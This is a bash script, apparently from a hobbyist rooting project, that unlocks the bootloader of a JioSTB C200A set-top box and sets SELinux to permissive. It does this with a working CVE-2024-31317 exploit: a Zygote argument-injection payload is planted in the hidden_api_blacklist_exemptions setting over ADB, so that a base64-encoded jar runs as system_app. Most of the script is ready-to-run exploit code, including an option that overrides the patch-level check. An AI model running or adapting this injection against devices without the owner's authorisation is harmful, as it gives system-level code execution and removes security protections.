#!/bin/bash
# ============================================================================
# JioSTB JMSC200A Bootloader Unlock — CVE-2024-31317 + ISystemControl HIDL
#
# Credits: Otus9051, Keratin, Anthropic
# ============================================================================
#
# This script unlocks the bootloader and sets SELinux to permissive
# by writing U-Boot environment variables through the Amlogic ISystemControl
# HIDL service, accessed from system_app context via Zygote injection.
#
# ⚠️  WARNING: Unlocking the bootloader will:
#   - Change verified boot state from "green" to "orange"
#   - Require a factory reset on first boot after unlock
#   - Show an "unlocked bootloader" warning on boot
#   - Widevine L1 DRM: may or may not survive the unlock depending on the
#     device variant. On the C200A (ohm/S905X4) L1 keys are in the TEE and
#     survived unlocking. Other STB models may invalidate L1 on unlock.
#   These changes are REVERSIBLE by re-locking (./unlock.sh relock)
#
# Prerequisites:
#   - ADB connected to the device (run stage1.sh first)
#   - bootenv.jar in the same directory as this script
#
# Usage:
#   ./unlock.sh                 # unlock bootloader (lock bitmask only)
#   ./unlock.sh read            # read-only: dump lock, lock_state, EnableSelinux
#   ./unlock.sh selinux         # set EnableSelinux=permissive (run AFTER factory reset)
#   ./unlock.sh relock          # re-lock bootloader (restores green/L1)
#   ./unlock.sh --force-asb ... # bypass the ASB date check (use at your own risk)
#   ./unlock.sh --skip-reboot   # skip the reboot (if device was just booted)
#
# Recommended flow:
#   1. ./stage1.sh                          # enable ADB
#   2. ./unlock.sh                          # unlock bootloader
#   3. adb reboot bootloader → fastboot reboot → factory reset (keyboard needed)
#   4. ./stage1.sh                          # re-enable ADB after reset
#   5. ./unlock.sh selinux                  # NOW set SELinux permissive
#   6. adb reboot                           # SELinux permissive takes effect
#   7. ./pull_boot.sh                       # extract boot.img for Magisk

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

FORCE_ASB=false
SKIP_REBOOT=false
ARGS=()
for arg in "$@"; do
    case "$arg" in
        --force-asb) FORCE_ASB=true ;;
        --skip-reboot) SKIP_REBOOT=true ;;
        *) ARGS+=("$arg") ;;
    esac
done
ACTION="${ARGS[0]:-full}"

# --- ASB (Android Security Bulletin) date check ---
# CVE-2024-31317 was patched in the June 2024 ASB. Devices on or past that
# patch level have the fix and this exploit will not work.
ASB_CUTOFF="2024-06-01"
ASB_DATE=$(adb shell getprop ro.build.version.security_patch 2>/dev/null | tr -d '[:space:]')

ASB_INT=$(echo "$ASB_DATE" | tr -d '-')
CUTOFF_INT=$(echo "$ASB_CUTOFF" | tr -d '-')
if [ -n "$ASB_DATE" ] && [ "$ASB_INT" -ge "$CUTOFF_INT" ] 2>/dev/null; then
    if [ "$FORCE_ASB" = true ]; then
        echo "⚠  ASB date is $ASB_DATE (≥ $ASB_CUTOFF) — CVE-2024-31317 is patched."
        echo "   --force-asb specified, continuing anyway..."
    else
        echo "✗  Device security patch level: $ASB_DATE"
        echo "   CVE-2024-31317 was patched in the $ASB_CUTOFF ASB."
        echo "   This exploit will not work on patched firmware."
        echo ""
        echo "   To override this check (e.g. if the device has a broken/fake ASB date):"
        echo "     $0 $ACTION --force-asb"
        exit 1
    fi
elif [ -z "$ASB_DATE" ]; then
    echo "⚠  Could not read ASB date (ro.build.version.security_patch). Proceeding anyway."
fi

JARB64=$(base64 -w0 "$SCRIPT_DIR/bootenv.jar")

build_cmd() {
    local bootenv_args="$1"
    echo "echo $JARB64 | base64 -d > /cache/be.jar && CLASSPATH=/cache/be.jar:/vendor/framework/droidlogic.jar /system/bin/app_process / BootEnv $bootenv_args"
}

case "$ACTION" in
    full|unlock)
        CMD="$(build_cmd 'set lock 10100000')"
        ;;
    read)
        CMD="$(build_cmd 'read lock') && $(build_cmd 'read lock_state') && $(build_cmd 'read EnableSelinux')"
        ;;
    selinux)
        CMD="$(build_cmd 'set EnableSelinux permissive')"
        ;;
    relock)
        CMD="$(build_cmd 'set lock 10101000') && $(build_cmd 'set EnableSelinux enforcing')"
        ;;
    *)
        echo "Usage: $0 [unlock|read|selinux|relock]"
        exit 1
        ;;
esac

PAYLOAD=$(printf 'LClass1;->method1(\n14\n--runtime-args\n--setuid=1000\n--setgid=1000\n--setgroups=1000\n--runtime-flags=43267\n--target-sdk-version=29\n--nice-name=bootenv31317\n--invoke-with\n%s ;\n--app-data-dir=/data/user/0/com.android.tv.settings\n--seinfo=platform:system_app:targetSdkVersion=29:complete\n--package-name=com.android.tv.settings\nandroid.app.ActivityThread' "$CMD")

echo "=== JioSTB C200A Bootloader Unlock ==="
echo "Action: $ACTION"
echo ""

if [ "$ACTION" = "relock" ]; then
    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    echo "!!!                    WARNING                        !!!"
    echo "!!!                                                   !!!"
    echo "!!!  RELOCKING CAN BRICK YOUR STB.                    !!!"
    echo "!!!                                                   !!!"
    echo "!!!  If you have flashed ANY custom images (boot,     !!!"
    echo "!!!  system, vendor, etc.), relocking will trigger     !!!"
    echo "!!!  AVB verification failure. The device will NOT     !!!"
    echo "!!!  boot and there is NO recovery method — Amlogic   !!!"
    echo "!!!  burn mode is disabled on this device.            !!!"
    echo "!!!                                                   !!!"
    echo "!!!  Only relock if you are 100% on STOCK firmware.   !!!"
    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    echo ""
    echo -n "Type YES to continue: "
    read -r CONFIRM
    if [ "$CONFIRM" != "YES" ]; then
        echo "Aborted."
        exit 1
    fi
    echo ""
fi

# Safety check
CURRENT=$(adb shell "settings get global hidden_api_blacklist_exemptions" 2>&1)
if [ "$CURRENT" != "null" ]; then
    echo "!!! WARNING: hidden_api_blacklist_exemptions is not null!"
    echo "!!! Current value: $CURRENT"
    echo "!!! Aborting to prevent boot loop. Clean up first:"
    echo "!!!   adb shell settings delete global hidden_api_blacklist_exemptions"
    exit 1
fi

if [ "$SKIP_REBOOT" = true ]; then
    echo "[*] Skipping reboot (--skip-reboot). Make sure Zygote hasn't been used this boot."
else
    echo "[*] Rebooting device (need fresh Zygote connection)..."
    adb reboot
    adb wait-for-device
    echo "[*] Waiting for boot..."
    while [ "$(adb shell getprop sys.boot_completed 2>/dev/null)" != "1" ]; do sleep 1; done
    echo "[*] Boot complete!"
fi

adb shell "logcat -c" 2>&1

echo "[*] Injecting CVE-2024-31317 payload..."
adb shell "settings put global hidden_api_blacklist_exemptions '$PAYLOAD'" 2>&1
adb shell "am force-stop com.android.tv.settings" 2>&1
sleep 1
adb shell "am start -n com.android.tv.settings/.MainSettings" 2>&1
sleep 2

echo "[*] Cleaning up payload (CRITICAL — prevents boot loops)..."
adb shell "settings delete global hidden_api_blacklist_exemptions" 2>&1
REMAINING=$(adb shell "settings get global hidden_api_blacklist_exemptions" 2>&1)
if [ "$REMAINING" != "null" ]; then
    echo "!!! FORCE CLEANUP !!!"
    adb shell "settings delete global hidden_api_blacklist_exemptions" 2>&1
fi
echo "[*] Payload cleaned: $(adb shell 'settings get global hidden_api_blacklist_exemptions' 2>&1)"

echo "[*] Waiting for execution..."
sleep 12

echo ""
echo "=== RESULTS ==="
adb shell "logcat -d | grep 'BootEnv'" 2>&1
echo ""

if [ "$ACTION" = "full" ] || [ "$ACTION" = "unlock" ]; then
    echo ""
    echo "=== Next steps ==="
    echo "1. Reboot to fastboot:  adb reboot bootloader"
    echo "2. Verify unlock:       fastboot getvar unlocked"
    echo "3. Reboot:              fastboot reboot"
    echo "4. Plug in a USB keyboard — the first boot will require a factory reset."
    echo ""
    echo "After factory reset:"
    echo "  5. Re-run stage1.sh to re-enable ADB"
    echo "  6. Run: ./unlock.sh selinux        (sets SELinux permissive)"
    echo "  7. Run: adb reboot                 (SELinux takes effect)"
    echo "  8. Run: ./pull_boot.sh             (extract boot.img for Magisk)"
fi

if [ "$ACTION" = "selinux" ]; then
    echo ""
    echo "SELinux set to permissive. Reboot for it to take effect:"
    echo "  adb reboot"
    echo ""
    echo "After reboot, run: ./pull_boot.sh"
fi
